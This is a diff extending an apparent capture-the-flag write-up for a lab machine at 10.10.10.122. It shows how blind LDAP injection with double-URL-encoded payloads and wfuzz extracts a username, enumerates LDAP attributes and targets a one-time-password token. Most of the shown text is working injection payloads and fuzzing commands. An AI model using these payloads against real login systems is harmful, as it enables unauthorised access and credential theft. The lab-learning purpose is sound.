@@ -62,22 +62,135 @@ As double URL encoded characters get us different responses, we will fuzz for th
 In this wordlist there are all 256 ASCII characters but double URL encoded.
 
 Short explanation of double URL encoding
->This is the double URL encoded character for A:
+>This is the double URL encoded character for **A**:
 %2541
 
->An application decodes %25 first (thats %) and then we are left with **%41**.
-This will be decoded after and then we are left with **A** 
+>An application decodes %25 first (thats **%**) and then we are left with **%41**.
+This will be decoded after and then we are left with **A**
 
 The command with _wfuzz_ looks like this:
 ```markdown
-wfuzz --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt  hxxp://10.10.10.122/login.php
+wfuzz --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt hxxp://10.10.10.122/login.php
 ```
 
 The results are:
 - %2500 = Null Byte
 - %2528 = (
 - %2529 = )
-- %255a = *
+- %252a = *
 - %255c = \
 
 Looking at these characters it becomes clear that these are used in **LDAP queries**!
+
+#### Creating an LDAP query
+
+We will manually create an LDAP query and test it with Burpsuite as a proxy.
+First we need to need to check when the query is successful. After a little bit of trying, we find out that 3 closed parentheses after the username gives us a different result:
+
+```markdown
+inputUsername=Testerman%2529%2529%2529%2500&inputOTP=1234
+
+URL-encoded:
+inputUsername=Testman)))&inputOTP=1234
+```
+
+We can imagine the query looks like this now:
+```markdown
+(&
+  (&
+    (password=testpass)
+    (uid=Testman)))
+  )
+  (|
+    (compare something)
+  )
+)
+```
+
+Now we kind of know the structure how it could look like, so lets see what happens on a wildcard character:
+
+```markdown
+inputUsername=%252a&inputOTP=1234
+
+URL-encoded:
+inputUsername=*&inputOTP=1234
+```
+
+By requesting this we get **Cannot Login** on the webpage instead of **User test not found**. This means we can find a valid username letter by letter by Fuzzing.
+
+In _Seclists_ the wordlist _char.txt_ has every character of the alphabet and that is what we need for the next Fuzz.
+The WFUZZ command looks like this:
+```markdown
+wfuzz --hw 233 -d 'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
+```
+
+This goes through the wordlist and gives us the result which letter is valid in front of a wildcard. In this case it just gave the letter **l**.
+Now lets fuzz the next letter:
+```markdown
+wfuzz --hw 233 -d 'inputUsername=lFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
+> Output: d
+
+wfuzz --hw 233 -d 'inputUsername=ldFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
+> Output: a
+
+wfuzz --hw 233 -d 'inputUsername=ldaFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
+> Output: p
+
+wfuzz --hw 233 -d 'inputUsername=ldapFUZZ%252a&inputOTP=1234' -w char.txt hxxp://10.10.10.122/login.php
+> Output: u
+...
+```
+
+If we do this until Wfuzz doesn't give us any output we get the username **ldapuser**!
+
+#### Getting the attributes of the user
+
+Now we have the user we need the attributes to enumerate futher. Our LDAP query need to look like this:
+```markdown
+(&
+  (&
+    (password=testpass)
+    (uid=ldapuser)))
+    ($attribute=*
+  )
+  (|
+    (compare something)
+  )
+)
+```
+
+There are some default LDAP attributes we know of that we are going to check. There is a nice list on the repository [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) that we are going to use.
+
+We want to fuzz for the attributes like this:
+```markdown
+ldapuser%2529%2528FUZZ%253d%252a
+
+URL-encoded:
+ldapuser)(FUZZ=*
+```
+
+The Wfuzz command looks like this:
+```markdown
+wfuzz --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt hxxp://10.10.10.122/login.php
+```
+
+This gives us all the valid attributes:
+> commonName, cn, mail, name, pager, objectClass, uid, userPassword, sn, surname
+
+As we are looking for the software token right now, we should enumerate the value of that attribute with Wfuzz like we enumerated the username. The only attribute that makes sense for a 81 digit number is **pager**.
+
+Now our LDAP query looks like this:
+```markdown
+(&
+  (&
+    (password=testpass)
+    (uid=ldapuser)))
+    (pager=<81 digits>
+  )
+  (|
+    (compare something)
+  )
+)
+```
+
+We will use the same technique as how we enumerated the username, but as this is 81 digits, we will automate that process by writing a script. The script is in this repository and is called _fuzztoken.py_.
